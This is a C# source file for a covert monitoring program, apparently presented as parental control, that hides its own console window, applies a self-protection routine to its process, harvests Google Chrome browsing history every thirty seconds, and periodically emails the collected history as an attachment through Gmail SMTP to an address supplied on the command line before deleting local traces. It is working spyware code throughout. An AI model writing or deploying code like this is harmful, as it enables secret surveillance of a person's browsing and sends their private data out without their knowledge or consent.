﻿using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Net.Mime;
using System.Timers;
using System.Linq;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace Core
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        static Timer timer;
        static ChromeBrowser cb;

        static string UserName = string.Empty;

        static string SendTo = string.Empty;
        static string SendFrom = string.Empty;
        static string SendFromPassword = string.Empty;
        static int ReportCount = 3;

        static int iteration = 0;

        static void Main(string[] args)
        {
            ShowWindow(GetConsoleWindow(), 0);
            ProtectionProcess pp = new ProtectionProcess();
            pp.ProtectionOn(Process.GetCurrentProcess().Handle);

            SendTo = args[0];
            SendFrom = args[1];
            SendFromPassword = args[2];

            cb = new ChromeBrowser();
            timer = new Timer(1000 * 60 * .5d);
            timer.Elapsed += TimerElapsed;

            GetGoogleChromeHistory();
            timer.Start();

            while (true) { }
        }

        static void SendReport(string browserName, string report)
        {
            var fromAddress = new MailAddress(SendFrom, "Core App");
            var toAddress = new MailAddress(SendTo, "Parent");

            var smtp = new SmtpClient
            {
                Host = "smtp.gmail.com",
                Port = 587,
                EnableSsl = true,
                DeliveryMethod = SmtpDeliveryMethod.Network,
                UseDefaultCredentials = false,
                Credentials = new NetworkCredential(fromAddress.Address, SendFromPassword)
            };

            Attachment attachment = new Attachment(report, MediaTypeNames.Application.Octet);
            ContentDisposition disposition = attachment.ContentDisposition;
            disposition.CreationDate = File.GetCreationTime(report);
            disposition.ModificationDate = File.GetLastWriteTime(report);
            disposition.ReadDate = File.GetLastAccessTime(report);
            disposition.FileName = Path.GetFileName(report);
            disposition.Size = new FileInfo(report).Length;
            disposition.DispositionType = DispositionTypeNames.Attachment;

            using (var message = new MailMessage(fromAddress, toAddress))
            {
                message.Subject = $"Report from {UserName}";
                message.Body = "Open report in ReportViewer";

                message.Attachments.Add(attachment);

                smtp.Send(message);
            }

            File.Delete(report);

            Environment.Exit(0);
            iteration = 0;
        }
        static void SaveReport(string browserName, List<HistoryElement> history)
        {
            if (!Directory.Exists($@"{Environment.CurrentDirectory}\reports\{browserName} "))
                Directory.CreateDirectory($@"{Environment.CurrentDirectory}\reports\{browserName} ");
            
            using (StreamWriter sw = File.CreateText($@"{Environment.CurrentDirectory}\reports\{browserName}\{DateTime.Now.ToShortDateString()} {DateTime.Now.ToShortTimeString().Replace(':', '_')}.json"))
                sw.Write(JsonConvert.SerializeObject(history));
        }
        static async Task<string> PrepareReport(string browserName)
        {
            string path = $@"{Environment.CurrentDirectory}\reports\{browserName}\{DateTime.Now.ToShortDateString()} {DateTime.Now.ToShortTimeString().Replace(':', '_')}.json";
            
            List<HistoryElement> listForWrite = new List<HistoryElement>();

            foreach (var item in Directory.GetFiles($@"{Environment.CurrentDirectory}\reports\{browserName}"))
            {
                var list2 = JsonConvert.DeserializeObject<List<HistoryElement>>(File.ReadAllText(item));

                if (listForWrite.Count == 0)
                    listForWrite.AddRange(list2);
                else
                    listForWrite = listForWrite.Union(list2).ToList();


                File.Delete(item);
            }

            using (StreamWriter sw = File.CreateText(path))
                await sw.WriteAsync(JsonConvert.SerializeObject(listForWrite));

            return path;
        }

        static async void GetGoogleChromeHistory(bool send = false)
        {
            cb.UpdateHistory();
            SaveReport(cb.Name, cb.History);

            if (send)
                SendReport(cb.Name, await PrepareReport(cb.Name));
        }

        private static void TimerElapsed(object sender, ElapsedEventArgs e)
        {
            iteration++;
            GetGoogleChromeHistory(iteration > ReportCount);

            timer.Start();
        }
    }
}
